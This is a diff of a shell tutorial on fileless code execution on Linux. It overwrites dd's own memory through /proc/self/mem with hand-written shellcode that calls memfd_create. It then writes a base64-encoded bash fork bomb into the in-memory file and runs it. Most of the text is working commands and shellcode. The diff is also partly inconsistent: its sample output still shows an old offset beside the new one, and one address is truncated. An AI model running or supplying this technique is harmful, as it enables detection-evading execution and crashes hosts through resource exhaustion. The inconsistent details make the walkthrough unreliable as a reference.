@@ -102,46 +102,29 @@ hexdump -v -e '"\\""x" 1/1 "%02x" ""' memfd
 next, we find the PID addresses for DD fclose,
 
 ```shell
-setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd"
-```
-```shell
-555555554000-555555556000 r--p 00000000 ca:01 262762      /usr/bin/dd
-555555556000-555555564000 r-xp 00002000 ca:01 262762      /usr/bin/dd
-555555564000-555555569000 r--p 00010000 ca:01 262762      /usr/bin/dd
-555555569000-55555556a000 r--p 00014000 ca:01 262762      /usr/bin/dd
-55555556a000-55555556b000 rw-p 00015000 ca:01 262762      /usr/bin/dd
-```
-
-let's remove what we don't need,
-```shell
-setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd" | head -c 12
+setarch x86_64 -R dd if=/proc/self/maps 2>/dev/null | awk '/\/bin\/dd/ { split($1,a,"-"); print a[1]; exit }'
 ```
 - ```55555555400```
 
 ```shell
-objdump -Mintel -d `which dd` | grep fclose
+objdump -d --section=.text "$(which dd)" | awk '/<fclose@plt>/ && /jmp/ { sub(/:/,"",$1); print $1 }'
 ```
 ```shell
 0000000000002170 <fclose@plt>:
     67e6:   e8 85 b9 ff ff     call   2170 <fclose@plt>
     681b:   e9 50 b9 ff ff     jmp    2170 <fclose@plt>
 ```
-let's remove what we don't need,
-
-```shell
-objdump -Mintel -d `which dd` | grep fclose | tr -d ' ' | grep jmp | cut -c 1-4
-```
-- ```681b```
+- ```6c03```
 
 we see the PID addresses are,
 - ```0x555555554000```
-- ```0x681b```
+- ```0x6c03```
 
 now, let's put that into some variables,
 
 ```bash
-pid_address_1=$(setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd" | head -c 12)
-pid_address_2=$(objdump -Mintel -d `which dd` | grep fclose | tr -d ' ' | grep jmp | cut -c 1-4)
+pid_address_1=$(setarch x86_64 -R dd if=/proc/self/maps 2>/dev/null | awk '/\/bin\/dd/ { split($1,a,"-"); print a[1]; exit }')
+pid_address_2=$(objdump -d --section=.text "$(which dd)" | awk '/<fclose@plt>/ && /jmp/ { sub(/:/,"",$1); print $1 }')
 ```
 
 now, let's create some shellcode that uses the hexdump and PID addresses to create an in-memory-only file,
@@ -184,8 +167,8 @@ putting it all together we have,
 
 ```bash
 #!/bin/bash
-pid_address_1=$(setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd" | head -c 12)
-pid_address_2=$(objdump -Mintel -d `which dd` | grep fclose | tr -d ' ' | grep jmp | cut -c 1-4)
+pid_address_1=$(setarch x86_64 -R dd if=/proc/self/maps 2>/dev/null | awk '/\/bin\/dd/ { split($1,a,"-"); print a[1]; exit }')
+pid_address_2=$(objdump -d --section=.text "$(which dd)" | awk '/<fclose@plt>/ && /jmp/ { sub(/:/,"",$1); print $1 }')
 echo -n -e "\x48\x31\xc0\x48\x31\xff\x66\xbf\x0a\x00\xb8\x20\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\xff\xc7\xb8\x20\x00\x00\x00\x0f\x05\x68\x73\x6f\x43\x78\x48\x89\xe7\xbe\x00\x00\x00\x00\xb8\x3f\x01\x00\x00\x0f\x05\xb8\x22\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05" | setarch x86_64 -R dd of=/proc/self/mem bs=1 seek=$(( 0x$pid_address_1 + 0x$pid_address_2 )) conv=notrunc 10<&0 11<&1 & sudo ls -al /proc/$(pidof dd)/fd/
 echo "IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=" | base64 -d > /proc/`pidof dd`/fd/3
 /proc/`pidof dd`/fd/3 -a
